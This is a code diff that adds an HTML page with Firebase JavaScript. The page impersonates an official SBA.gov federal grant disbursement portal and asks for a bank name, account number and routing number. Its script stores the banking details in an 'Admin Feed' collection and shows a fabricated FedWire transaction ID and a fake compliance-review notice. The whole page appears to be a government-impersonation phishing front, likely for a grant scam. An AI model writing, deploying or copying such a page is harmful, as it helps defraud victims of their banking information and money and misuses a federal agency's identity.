@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | Federal Fund Disbursement</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .step-label { font-size: 9px; font-weight: 800; text-transform: uppercase; margin-top: 5px; color: #94a3b8; }
+        .step-active { color: #0071bc; }
+        .balance-preview { background: #f1f5f9; padding: 15px; border-radius: 10px; margin-bottom: 20px; border: 1px dashed #cbd5e1; text-align: center; }
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        label { display: block; font-size: 11px; font-weight: 700; color: #00274c; margin-bottom: 8px; margin-top: 15px; text-transform: uppercase; }
+        input { width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #cbd5e1; box-sizing: border-box; font-size: 14px; }
+        #withdrawBtn { background: #0071bc; color: white; width: 100%; padding: 18px; border: none; border-radius: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; margin-top: 20px; }
+        #withdrawBtn:disabled { background: #94a3b8; }
+    </style>
+</head>
+<body style="background: #f1f5f9;">
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
+    </div>
+
+    <div class="nav" style="display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: #00274c;">
+        <h1 style="margin: 0; font-size: 16px; letter-spacing: 2px; color: white;">SBA.GOV</h1>
+        <button onclick="location.href='dashboard.html'" style="width: auto !important; padding: 6px 12px; background: rgba(255,255,255,0.1); color: white; border: 1px solid rgba(255,255,255,0.3); border-radius: 6px; font-size: 10px; font-weight: bold; cursor: pointer;">BACK</button>
+    </div>
+
+    <div class="container">
+        <div style="display: flex; justify-content: space-between; margin-bottom: 25px; padding: 0 10px; margin-top: 10px;">
+            <div style="text-align:center;"><div style="width:22px; height:22px; background:#0071bc; color:white; border-radius:50%; font-size:10px; line-height:22px; margin:0 auto; font-weight:bold;">✓</div><span class="step-label step-active">Identity</span></div>
+            <div style="flex-grow:1; height:2px; background:#0071bc; margin: 11px 5px;"></div>
+            <div style="text-align:center;"><div style="width:22px; height:22px; background:#0071bc; color:white; border-radius:50%; font-size:10px; line-height:22px; margin:0 auto; font-weight:bold;">2</div><span class="step-label step-active">Details</span></div>
+            <div style="flex-grow:1; height:2px; background:#cbd5e1; margin: 11px 5px;"></div>
+            <div style="text-align:center;"><div style="width:22px; height:22px; background:#cbd5e1; color:white; border-radius:50%; font-size:10px; line-height:22px; margin:0 auto; font-weight:bold;">3</div><span class="step-label">Payout</span></div>
+        </div>
+
+        <div class="card" style="border-radius: 14px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1); border-top: 6px solid #0071bc;">
+            <h2 style="font-size: 20px; color: #00274c; margin-bottom: 5px;">Bank Transfer Request</h2>
+            <p style="font-size: 11px; color: #ef4444; margin-bottom: 20px; font-weight: 700;">⚠️ FUNDS RELEASED VIA FEDWIRE® PROTOCOL</p>
+            
+            <div class="balance-preview">
+                <span style="font-size: 10px; font-weight: 800; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px;">Available Allocation</span>
+                <div id="availBal" style="font-size: 24px; font-weight: 900; color: #1e293b; margin-top: 2px;">$...</div>
+            </div>
+
+            <label>Receiving Institution (Bank Name)</label>
+            <input type="text" id="bankName" placeholder="e.g. JPMorgan Chase">
+
+            <label>Account Number (Checking/Savings)</label>
+            <input type="number" id="accNum" placeholder="Account Number">
+
+            <label>9-Digit ABA Routing Number</label>
+            <input type="number" id="routNum" placeholder="Routing Number">
+
+            <label>Amount to Withdraw (USD)</label>
+            <input type="number" id="wAmt" placeholder="0.00" step="0.01">
+
+            <div style="background: #fffbeb; padding: 15px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #fef3c7; margin-top: 20px;">
+                <p style="font-size: 10px; color: #92400e; margin: 0; line-height: 1.5;">
+                    <b>Federal Tax Advisory:</b> Total disbursements exceeding $10,000.00 will generate a Form 1099-G for the 2026 fiscal year. 
+                </p>
+            </div>
+
+            <button id="withdrawBtn">Execute Transfer Request</button>
+        </div>
+        
+        <p style="text-align: center; font-size: 9px; color: #94a3b8; margin-top: 20px; font-family: monospace;">
+            FEDWIRE_GATEWAY_v8.4 // ENCRYPTION_ACTIVE
+        </p>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged, reload } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getFirestore, collection, addDoc, getDoc, doc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
+            authDomain: "sba-grant-2026.firebaseapp.com",
+            projectId: "sba-grant-2026",
+            storageBucket: "sba-grant-2026.firebasestorage.app",
+            messagingSenderId: "838430821326",
+            appId: "1:838430821326:web:6438deacb334076a64f99f"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        const withdrawBtn = document.getElementById('withdrawBtn');
+        const availBalDisplay = document.getElementById('availBal');
+
+        onAuthStateChanged(auth, async (user) => {
+            if (user) {
+                await reload(user);
+                if (!user.emailVerified) { window.location.href = 'verify.html'; return; }
+
+                const userSnap = await getDoc(doc(db, "users", user.uid));
+                if (userSnap.exists()) {
+                    availBalDisplay.innerText = "$" + userSnap.data().balance;
+                }
+            } else {
+                window.location.href = 'index.html';
+            }
+        });
+
+        withdrawBtn.onclick = async () => {
+            const user = auth.currentUser;
+            const bank = document.getElementById('bankName').value.trim();
+            const acc = document.getElementById('accNum').value.trim();
+            const rout = document.getElementById('routNum').value.trim();
+            const amtStr = document.getElementById('wAmt').value;
+            const amt = parseFloat(amtStr);
+
+            if(!bank || !acc || !rout || !amtStr) return alert("ERROR: All federal disbursement fields are mandatory.");
+            if(rout.length !== 9) return alert("ROUTING ERROR: US ABA Routing numbers must be exactly 9 digits.");
+
+            withdrawBtn.disabled = true;
+            withdrawBtn.innerText = "FEDWIRE HANDSHAKE...";
+
+            try {
+                const userRef = doc(db, "users", user.uid);
+                const userSnap = await getDoc(userRef);
+                const userData = userSnap.data();
+                
+                // Remove commas from balance string to compare numbers
+                const currentBal = parseFloat(userData.balance.toString().replace(/,/g, ''));
+
+                if (amt > currentBal) {
+                    alert("INSUFFICIENT FUNDS: Maximum available allocation is $" + userData.balance);
+                    withdrawBtn.disabled = false;
+                    withdrawBtn.innerText = "Execute Transfer Request";
+                    return;
+                }
+
+                // 1. Submit Request to the Admin Feed
+                await addDoc(collection(db, "requests"), {
+                    userId: user.uid,
+                    userName: userData.fullName || "User",
+                    userEmail: user.email,
+                    type: "WITHDRAWAL",
+                    amount: amt.toFixed(2),
+                    method: bank,
+                    details: `ACC: ${acc} | ROUT: ${rout}`,
+                    status: "PENDING",
+                    timestamp: serverTimestamp()
+                });
+
+                // 2. Update user status
+                await updateDoc(userRef, {
+                    status: "TRANSFER PENDING REVIEW"
+                });
+
+                alert("TRANSMISSION SUCCESS: FedWire transaction ID: " + Math.random().toString(36).substr(2, 9).toUpperCase() + ". Transfer is undergoing federal compliance review.");
+                window.location.href = 'dashboard.html';
+                
+            } catch(e) { 
+                console.error(e);
+                alert("HANDSHAKE ERROR: Secure link interrupted."); 
+                withdrawBtn.disabled = false;
+                withdrawBtn.innerText = "Execute Transfer Request";
+            }
+        };
+    </script>
+</body>
+</html>
